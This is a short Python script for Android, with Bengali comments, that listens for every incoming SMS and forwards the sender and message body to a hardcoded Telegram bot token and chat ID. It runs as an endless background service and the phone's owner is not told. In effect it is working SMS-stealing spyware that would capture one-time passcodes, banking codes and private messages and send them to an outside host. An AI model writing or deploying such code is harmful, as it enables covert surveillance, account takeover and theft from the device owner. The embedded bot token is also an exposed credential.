import requests
from android.broadcast import BroadcastReceiver
from android.permissions import request_permissions, Permission
from jnius import autoclass
from time import sleep

# টেলিগ্রাম বট তথ্য
BOT_TOKEN = "7888176286:AAGqGm9AxEab-tYiugylhr-UHnIHb-8bpvI"  # আপনার টেলিগ্রাম বট টোকেন দিন
CHAT_ID = "6566668050"      # আপনার চ্যাট আইডি দিন

# টেলিগ্রামে এসএমএস পাঠানোর ফাংশন
def send_sms_to_telegram(sender, message):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {"chat_id": CHAT_ID, "text": f"SMS from {sender}: {message}"}
    try:
        requests.post(url, data=payload)
    except Exception as e:
        print(f"Error sending SMS to Telegram: {e}")

# ব্যাকগ্রাউন্ড সার্ভিস
class SMSReceiver(BroadcastReceiver):
    def onReceive(self, context, intent):
        if intent.getAction() == "android.provider.Telephony.SMS_RECEIVED":
            SmsMessage = autoclass("android.telephony.SmsMessage")
            sms_data = intent.getExtras().get("pdus")
            for pdu in sms_data:
                sms = SmsMessage.createFromPdu(pdu)
                sender = sms.getOriginatingAddress()
                message = sms.getMessageBody()

                # টেলিগ্রামে পাঠানো
                send_sms_to_telegram(sender, message)

if __name__ == "__main__":
    # পেরমিশন অনুরোধ
    request_permissions([Permission.RECEIVE_SMS, Permission.INTERNET])

    # ব্রডকাস্ট রিসিভার শুরু
    receiver = SMSReceiver()
    receiver.start()

    print("Background service running...")
    while True:
        sleep(10)  # সার্ভিস চালু রাখার জন্য লুপ